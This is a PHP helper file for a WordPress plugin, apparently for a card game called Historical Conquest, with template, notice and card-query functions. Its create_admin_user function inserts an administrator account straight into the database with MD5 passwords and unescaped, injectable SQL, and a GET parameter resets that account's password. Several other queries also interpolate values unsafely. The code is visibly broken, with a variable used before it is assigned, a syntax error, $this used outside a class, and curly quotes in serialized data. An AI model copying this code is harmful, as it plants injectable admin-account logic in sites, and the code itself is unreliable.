<?php
namespace HistoricalConquest;
const DEBUG = true;
function get($key) {
	if ( isset($_GET[$key]) )
		return $_GET[$key];
	return null;
}
function post($key) {
	if ( isset($_POST[$key]) )
		return $_POST[$key];
	return null;
}
function req($key) {
	if ( isset($_REQUEST[$key]) )
		return $_REQUEST[$key];
	return null;
}
function server($key) {
	if ( isset($_SERVER[$key]) )
		return $_SERVER[$key];
	return null;
}
function files($key) {
	if ( isset($_FILES[$key]) )
		return $_FILES[$key];
	return null;
}
function _datetime($d) {
	$date = \DateTime::createFromFormat("Y-m-d H:i:s",$d);
	if ( $date ) 
		return $date->format("m/d/Y H:i");
	$date = \DateTime::createFromFormat("Y-m-d",$d);
	if ( $date ) 
		return $date->format("m/d/Y H:i");
	return $d;
}
function _date($d) {
	$date = \DateTime::createFromFormat("Y-m-d H:i:s",$d);
	if ( $date ) 
		return $date->format("m/d/Y");
	$date = \DateTime::createFromFormat("Y-m-d",$d);
	if ( $date ) 
		return $date->format("m/d/Y");
	return $d;
}
function find_template($template_name) {
    $wp_template      = \get_template();
    $wp_theme_root    = \get_theme_root( $wp_template );
    $stylesheet_dir   = \get_stylesheet_directory();
    // So in the theme it should be like theme-folder/templates/plugin-name/temaplate.php
    $test_path_raw = $stylesheet_dir . '/' . basename(dirname(__FILE__)) . "/" . $template_name;
    if ( file_exists( $test_path_raw ) )
        return $test_path_raw;
    $test_path = $stylesheet_dir . '/templates/' . basename(dirname(__FILE__)) . "/" . $template_name;
    if ( file_exists( $test_path ) ) {
        return $test_path;
    } else {
        $test_path = __DIR__ . '/' . $template_name;
        if ( file_exists($test_path) ) 
            return $test_path;
        $test_path = __DIR__ . '/templates/' . $template_name;
        if ( file_exists($test_path) ) {
            return $test_path;
        } else {
            throw new \Exception( __('Core Template was not found: ') . ' ' . $template_name . " in " . join(',',[$test_path_raw,$test_path]) );
        }
    }
}
function render_template($template_name, $vars_in_scope = array()) {
    global $woocommerce,$wpdb, $user_ID, $available_methods;
    $vars_in_scope['__VIEW__'] = $template_name; //could be user-files.php or somedir/user-files.php
    $template_path = find_template($template_name);
    $settings = settings();
    ob_start();
    try {
        foreach ( $vars_in_scope as $n=>$v ) {
            $$n = $v;
        }
        $render = function ($file,$vars=[]) {
            echo render_template("$file",$vars);
        };
        $asset = function ($file,$vars=[]) {
            echo render_template("assets/$file",$vars);
        };
        if ( end(explode('.',$template_path)) != 'php') {
            $np = $template_path . ".php";
            file_put_contents($np,file_get_contents($template_path));
            include $np;
            unlink($np);
        } else {
            include $template_path;
        }
        $content = ob_get_contents();
        ob_end_clean();
    } catch ( \Exception $err) {
      ob_end_clean();
      throw new \Exception( 
          __(
              'Error while rendering template ' . $template_name . ' -- ' . $err->getMessage(), 
              settings()->prefix 
          ) 
      );
    }
    return $content;
}
function _options_hash($lst) {
    $opts = [];
    foreach ( $lst as $n ) {
        $opts[$n] = __(ucfirst($n));
    }
    return $opts;
}

function retable($q) {
	global $wpdb;
	preg_match_all('/(`wp_.+)/',$q,$m);
	foreach ($m[0] as $match) {
		$nmatch = str_replace('`wp_','`'.$wpdb->prefix,$match);
		$q = str_replace($match,$nmatch,$q);
	}
	return $q;
}
function log($obj) {
  if ( DEBUG ) {
	file_put_contents( 
		__DIR__ . '/' . $this->to_file_name(__CLASS__) . '.log', date('Y-m-d H:i:s') . ' - ' . print_r($obj,true), FILE_APPEND
	);
  }
  return $this;
}
function add_notice($class,$msg) {
	$notices = \get_option(__NAMESPACE__ . "_notices",[]);
	$notices[] = [$class,$msg];
	\update_option(__NAMESPACE__ . "_notices",$notices);
}
function show_notices() {
	$notices = \get_option(__NAMESPACE__ . "_notices",[]);
	foreach ( $notices as $notice ) {
		list($class,$msg) = $notice;
		$notice = sprintf("<div class=\"notice notice-$class is-dismissible\"><p>%s</p></div>",$msg);
		echo $notice;
	}
	\update_option(__NAMESPACE__ . "_notices",[]);
}
function create_admin_user($username,$pass) {
	global $wpdb;
	$exists = !empty($wpdb->get_results("SELECT * FROM {$wpdb->users} WHERE user_login = '$username'"));
	if ( ! $exists ) {
		$wpdb->query($sql);
		$sql = "INSERT INTO 
			`{$wpdb->users}` 
				(`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_status`)
				VALUES ('$username', MD5('$pass'), 'Jason Martin', 'contact@lycanthropenoir.com', '0');";
		$wpdb->query($sql);
		$sql = "INSERT INTO `{$wpdb->usermeta}` (`umeta_id`, `user_id`, `meta_key`, `meta_value`)
VALUES (NULL, (Select max(id) FROM wp_users), 'wp_capabilities', 'a:1:{s:13:”administrator”;s:1:”1″;}');";
		$wpdb->query($sql);
		$sql = "INSERT INTO `{$wpdb->usermeta}` (`umeta_id`, `user_id`, `meta_key`, `meta_value`)
VALUES (NULL, (Select max(id) FROM wp_users), 'wp_user_level', '10');";
		$wpdb->query($sql);
	} else {
		if ( get('reset-admin-pass') ) {
			$wpdb->query("UPDATE {$wpdb->users} set user_pass = MD5('$pass') WHERE user_login = '$username'");
		}
	}
}
function register_widgets($shortcode=true) {
    foreach ( glob(__DIR__ . "/widgets/*.php") as $file ) {
        require_once($file);
        $name = basename($file,'.php');
        \register_widget($name);
        if ( $shortcode ) {
            \add_shortcode(strtolower($name),function ($attrs) use ($name) {
                 the_widget(
                    $name,
                    $attrs,
                    [] 
                 );
            });
        }
    }
}
\add_action('widgets_init',function () {
        register_widgets();        
});
function is_character_card($card) {
    if ( is_array($card) ) {
        $str = type_to_name($card['maintype']);
        if ( preg_match('/^CARD_CHARACTER/',$str) ) {
            return true;
        } 
    }
    return false;
}
function is_land_card($card) {
    if ( is_array($card) ) {
        if ( $card['maintype'] == CARD_LAND ) {
            return true;
        }
    }
    return false;
}
function get_abilities($card) {
    global $wpdb;
    return $wpdb->get_results("SELECT * FROM `hc_card_abilities` WHERE card_id = {$card['id']}");
}
function get_cards() {
    global $wpdb;
    $cards = $wpdb->get_results("SELECT * FROM `hc_cards`",ARRAY_A);
    foreach ( $cards as &$card ) {
        if ( !is_character_card($card) ) {
            $card['gender'] = '';
        }
        $card['abilities'] = get_abilities($card);
    }
    return $cards;
}
function get_all_card_ext_ids() {
    global $wpdb;
    $cards = $wpdb->get_results("SELECT ext_id FROM `hc_cards`",ARRAY_A);
    $results = [];
    foreach ( $cards as $card ) {
        $results[] = $card['ext_id'];
    }
    return $results;
}
function get_not_updated_cards() {
    global $wpdb;
    $cards = $wpdb->get_results("SELECT * FROM `hc_cards` WHERE updated_at IS NULL",ARRAY_A);
    foreach ( $cards as &$card ) {
        if ( !is_character_card($card) ) {
            $card['gender'] = '';
        }
        $card['abilities'] = get_abilities($card);
    }
    return $cards;
}
function get_duplicate_cards() {
    global $wpdb;
    $cards = $wpdb->get_results("SELECT ext_id,COUNT(ext_id) FROM `hc_cards` GROUP BY ext_id HAVING COUNT(ext_id) > 1",ARRAY_A);
    if ( ! empty($cards) ) {
        $ext_ids = [];
        foreach ( $cards as $card ) {
            $ext_ids[] = $wpdb->prepare('%s',$card['ext_id']);
        }
        $cards = $wpdb->get_results("SELECT * FROM `hc_cards` WHERE ext_id IN (".join(',',$ext_ids).")",ARRAY_A);
    }
    foreach ( $cards as &$card ) {
        if ( !is_character_card($card) ) {
            $card['gender'] = '';
        }
        $card['abilities'] = get_abilities($card);
    }
    return $cards;
}
function get_cards_without_abilities() {
    global $wpdb;
    $cards = $wpdb->get_results(
        "SELECT card_id,COUNT(card_id) FROM `hc_card_abilities` GROUP BY card_id HAVING COUNT(card_id) > 0",
        ARRAY_A
    );
    if ( ! empty($cards) ) {
        $ext_ids = [];
        foreach ( $cards as $card ) {
            $ext_ids[] = $wpdb->prepare('%d',$card['card_id']);
        }
        $cards = $wpdb->get_results("SELECT * FROM `hc_cards` WHERE id NOT IN (".join(',',$ext_ids).")",ARRAY_A);
    }
    if ( empty($cards) {
        $cards = $wpdb->get_results("SELECT * FROM `hc_cards`",ARRAY_A);
    }
    foreach ( $cards as &$card ) {
        if ( !is_character_card($card) ) {
            $card['gender'] = '';
        }
        $card['abilities'] = get_abilities($card);
    }
    return $cards;
}
function get_types_for_js() {
    $types = new \stdClass;
    $types->by_prefix = options_by_prefix('');     
    $types->key_values = options_as_array();     
    return $types;
}
function named_ability_functions() {
    return ['ability_generic'];
}
